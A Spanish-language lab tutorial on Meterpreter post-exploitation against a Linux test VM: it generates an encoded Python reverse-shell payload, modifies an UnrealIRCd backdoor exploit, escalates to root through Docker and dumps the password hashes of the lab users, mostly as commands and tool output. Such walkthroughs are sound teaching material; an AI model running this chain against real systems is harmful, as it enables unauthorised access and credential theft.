# Linux (Meterpreter para Post-Explotación)

Esta shell o herramienta llamada `meterpreter` te da muchas facilidades a la hora de realizar tecnicas de `post-explotacion`, por lo que vamos a ver cuales son las mas relevantes de dicha herramienta.

Vamos a iniciar `metasploit`:

```shell
sudo msfconsole -q
```

> NOTA:

En concreto nosotros vamos a utilizar los modulos de `post-explotacion` de `Linux` de `metasploit` en la siguiente ruta:

```shell
cd /usr/share/metasploit-framework/modules/post/linux
```

Estando dentro de `metasploit` anteriormente explotamos una vulnerabilidad llamada `UnrealIRCD` la cual nos daba una shell y la vamos a explotar para ir a la fase de `post-explotacion`.

```shell
use unix/irc/unreal_ircd_3281_backdoor
```

La cosa es que en este modulo solo tienen `payloads` como `cmd, perl, ruby, etc...` pero no tienen una shell que tede un `meterpreter` por lo que vamos a ver a como generar nuestro porpio `payload` personalizado para que nos de un `meterpreter`.

Por lo que no nos interesa ahora mismo ese exploit, por lo que le daremos a `back` y vamos a explotarlo de forma manual con el exploit de `github` que encontramos anteriormente modificandole el codigo para que nos de una shell de `meterpreter` estando a la escucha con `metasploit`.

URL = [Pagina GitHub Exploit](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor)

Primero vamos a generar el `payload` de la siguiente forma con `msfvenom`:

```shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT>
```

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 436 bytes
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UN9LwzAQfm7+ir4lwRjWWasbVhDxQUSEzTcZo01ODU2TkGRaFf93GzI8uDu+u+9+qtFZH8tgxQCRfWvVs74L0NQsRH8QkUU1Anq1vpxKZUrfmTcg1YKuURH912yL0OZinh1ZsiPePt0+7LfPm7ubR5p4XFhjQERCcLVa8qq5nJVXZyvMLmahidR76AZUwCTAxdQ9jedBAzhyTpFu81b8YFwnBoKv7zEL3IP4IDWlL4sdku0Ra4o+35WGUoMhkl7puZ08+c+e5jBFMIEg6XAuQdjReQiB5B/wvqlTUEJish8c8Dr8UvQHedtfeQ==')[0])))
```

Y nos daria el `payload` en la terminal, por lo que copiamos eso y lo pegamos en el codigo del exploit de `giyhub`.

Clonamos el repositorio a nuestro `kali`:

```shell
git clone https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor.git
cd UnrealIRCd-3.2.8.1-Backdoor/
```

Una vez dentro de la carpeta, editaremos el `exploit.py` de la siguiente forma:

```shell
nano exploit.py

#Dentro del nano
python_payload = f'python -c "exec(__import__(\'zlib\').decompress(__import__(\'base64\').b64decode(__import__(\'codecs\').getencoder(\'utf-8\')(\'eNo9UN9LwzAQfm7+ir4lwRjWWasbVhDxQUSEzTcZo01ODU2TkGRaFf93GzI8uDu+u+9+qtFZH8tgxQCRfWvVs74L0NQsRH8QkUU1Anq1vpxKZUrfmTcg1YKuURH912yL0OZinh1ZsiPePt0+7LfPm7ubR5p4XFhjQERCcLVa8qq5nJVXZyvMLmahidR76AZUwCTAxdQ9jedBAzhyTpFu81b8YFwnBoKv7zEL3IP4IDWlL4sdku0Ra4o+35WGUoMhkl7puZ08+c+e5jBFMIEg6XAuQdjReQiB5B/wvqlTUEJish8c8Dr8UvQHedtfeQ==\')[0])))"'
```

Cambiamos el contenido de lo que viene por defecto en `python_payload` y lo cambiamos por eso, lo guardamos y listo para usar.

Ahora vamos dentro de `metasploit` a poner un `listener/handler` de la siguiente forma:

```shell
use multi/handler
set LHOST <IP>
set LPORT <PORT>
set payload python/meterpreter/reverse_tcp
run
```

Y con esto estariamos a la escucha listos de ejecutar el `exploit`.

Ahora en la otra terminal ejecutaremos el `exploit` de la siguiente forma:

```shell
./exploit.py <IP_VICTIM> 6667 -payload python
```

Info:

```
Exploit sent successfully!
```

Y si todo sale bien, en `metasploit` veremos esto:

```
[*] Started reverse TCP handler on 192.168.16.139:7777 
[*] Sending stage (24772 bytes) to 192.168.16.129
[*] Meterpreter session 1 opened (192.168.16.139:7777 -> 192.168.16.129:48517) at 2024-11-21 04:20:10 -0500

meterpreter >
```

Por lo que ya la habremos explotado.

Ahora tendremos que identificar que usuario somos con el siguiente comando:

```shell
getuid
```

Info:

```
Server username: boba_fett
```

Por lo que vemos somos un usuario normal.

Si en otra terminal nos vamos a donde estan todos los modulos de `post-explotacion` de `metasploit` en concreto en la carpeta `gather` veremos lo siguiente:

```shell
cd /usr/share/metasploit-framework/modules/post/linux/gather/
```

Info:

```
ansible_playbook_error_message_file_reader.rb  ecryptfs_creds.rb   enum_network.rb        f5_loot_mcp.rb            manageengine_password_manager_creds.rb  pptpd_chap_secrets.rb
ansible.rb                                     enum_commands.rb    enum_protections.rb    gnome_commander_creds.rb  mimipenguin.rb                          puppet.rb
apache_nifi_credentials.rb                     enum_configs.rb     enum_psk.rb            gnome_keyring_dump.rb     mount_cifs_creds.rb                     rancher_audit_log_leak.rb
checkcontainer.rb                              enum_containers.rb  enum_system.rb         haserl_read.rb            openvpn_credentials.rb                  tor_hiddenservices.rb
checkvm.rb                                     enum_nagios_xi.rb   enum_users_history.rb  hashdump.rb               phpmyadmin_credsteal.rb                 vcenter_secrets_dump.rb
```

Veremos varios modulos de explotacion.

Si queremos ejecutar uno dentro de nuestro `meterpreter` el cual hemos obtenido, podremos hacer de la siguiente forma:

```shell
run post/linux/gather/checkvm
```

Info:

```
[*] Gathering System info ....
[+] This appears to be a 'VMware' virtual machine
```

Con esto obtenemos informacion del sistema y nos dice que esta corriendo en una maquina virtual de `VMware`, lo cual es cierto.

Si por ejemplo quisieramos ejecutar el `hashdump` para dumpearnos todos los hashes, con este usuario no podriamos ya que nos pediria que tuvieramos un usuario como administrador.

Por lo que algunos modulos van a ir con dicho usuario y otros no.

Para nosotros poder intentar escalar privilegios, vamos a utilizar una serie de `exploits` locales, por lo que dejaremos esta sesion de `meterpreter` en segundo plano poniendo `background` para no perderla.

Nos vamos atras con `back` y vamos a utilizar un llamado `Recomendador de exploits`, podremo acceder a el ejecutando lo siguiente:

```shell
use post/multi/recon/local_exploit_suggester
```

Si nosotros hacemos el `show options` para ver sus opciones lo que vemos es que necesita una sesion activa la cual tenemos nosotros en segundo plano.

Por lo que le especificariamos la sesion con el siguiente comando:

```shell
set session 1
```

Y para ejecutar esto pondriamos `exploit` y ya estaria en ejecuccion:

```
[*] 192.168.16.129 - Collecting local exploits for python/linux...
[*] 192.168.16.129 - 196 exploit checks are being tried...
[+] 192.168.16.129 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
[+] 192.168.16.129 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 192.168.16.129 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 192.168.16.129 - exploit/linux/local/docker_daemon_privilege_escalation: The target is vulnerable.
[+] 192.168.16.129 - exploit/linux/local/overlayfs_priv_esc: The target appears to be vulnerable.
[+] 192.168.16.129 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 192.168.16.129 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
[+] 192.168.16.129 - exploit/linux/local/su_login: The target appears to be vulnerable.
[+] 192.168.16.129 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.9.5 is a vulnerable build.
[*] Running check method for exploit 69 / 69
[*] 192.168.16.129 - Valid modules for session 1:
============================

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 3   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 4   exploit/linux/local/docker_daemon_privilege_escalation              Yes                      The target is vulnerable.
 5   exploit/linux/local/overlayfs_priv_esc                              Yes                      The target appears to be vulnerable.
 6   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 7   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
 8   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 9   exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.9.5 is a vulnerable build.
```

En este caso nos ha encontrado unos cuantos `exploits` los cuales podemos aprovechar, entre ellos uno interesante llamado `docker_daemon` para escalar privilegios.

```
exploit/linux/local/docker_daemon_privilege_escalation
```

Por lo que vamos a entrar en el:

```shell
use exploit/linux/local/docker_daemon_privilege_escalation
```

Esto es una escalada de privilegios a traves de una vulnerabilidad que tenia `docker`.

Lo configuraremos de la siguiente forma:

```shell
set session 1
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <IP>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.16.139:4444 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: python
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Docker daemon is accessible.
[+] The target is vulnerable.
[*] Writing payload executable to '/tmp/sGcXSLhva'
[*] Executing script to create and run docker container
[*] Sending stage (1017704 bytes) to 192.168.16.129
[+] Deleted /tmp/sGcXSLhva
[*] Meterpreter session 2 opened (192.168.16.139:4444 -> 192.168.16.129:44925) at 2024-11-21 05:42:45 -0500
[*] Waiting 60s for payload

meterpreter >
```

Y por lo que vemos lo ha conseguido, si ahora hacemos un `getuid` para saber que usuario somos:

```
Server username: root
```

Veremos que ya somos `root`.

Ahora si por ejemplo queremos dumpearnos los hashes, si podriamos:

```shell
run post/linux/gather/hashdump
```

Info:

```
[+] vagrant:$6$h7Aa/gDP$/7K4DMVzrrGOeKVgOjDfehnIKQWkR2IxmxopIhllelCXvePQoJWY0HvRXhzNxeQiHJvBn5ZnnvnmFdaIKvMH//:900:900:vagrant,,,:/home/vagrant:/bin/bash
[+] leia_organa:$1$N6DIbGGZ$LpERCRfi8IXlNebhQuYLK/:1111:100::/home/leia_organa:/bin/bash
[+] luke_skywalker:$1$/7D55Ozb$Y/aKb.UNrDS2w7nZVq.Ll/:1112:100::/home/luke_skywalker:/bin/bash
[+] han_solo:$1$6jIF3qTC$7jEXfQsNENuWYeO6cK7m1.:1113:100::/home/han_solo:/bin/bash
[+] artoo_detoo:$1$tfvzyRnv$mawnXAR4GgABt8rtn7Dfv.:1114:100::/home/artoo_detoo:/bin/bash
[+] c_three_pio:$1$lXx7tKuo$xuM4AxkByTUD78BaJdYdG.:1115:100::/home/c_three_pio:/bin/bash
[+] ben_kenobi:$1$5nfRD/bA$y7ZZD0NimJTbX9FtvhHJX1:1116:100::/home/ben_kenobi:/bin/bash
[+] darth_vader:$1$rLuMkR1R$YHumHRxhswnfO7eTUUfHJ.:1117:100::/home/darth_vader:/bin/bash
[+] anakin_skywalker:$1$jlpeszLc$PW4IPiuLTwiSH5YaTlRaB0:1118:100::/home/anakin_skywalker:/bin/bash
[+] jarjar_binks:$1$SNokFi0c$F.SvjZQjYRSuoBuobRWMh1:1119:100::/home/jarjar_binks:/bin/bash
[+] lando_calrissian:$1$Af1ek3xT$nKc8jkJ30gMQWeW/6.ono0:1120:100::/home/lando_calrissian:/bin/bash
[+] boba_fett:$1$TjxlmV4j$k/rG1vb4.pj.z0yFWJ.ZD0:1121:100::/home/boba_fett:/bin/bash
[+] jabba_hutt:$1$9rpNcs3v$//v2ltj5MYhfUOHYVAzjD/:1122:100::/home/jabba_hutt:/bin/bash
[+] greedo:$1$vOU.f3Tj$tsgBZJbBS4JwtchsRUW0a1:1123:100::/home/greedo:/bin/bash
[+] chewbacca:$1$.qt4t8zH$RdKbdafuqc7rYiDXSoQCI.:1124:100::/home/chewbacca:/bin/bash
[+] kylo_ren:$1$rpvxsssI$hOBC/qL92d0GgmD/uSELx.:1125:100::/home/kylo_ren:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20241121054519_default_192.168.16.129_linux.hashes_170490.txt
```

Y ahi obtendriamos todos los hashes.
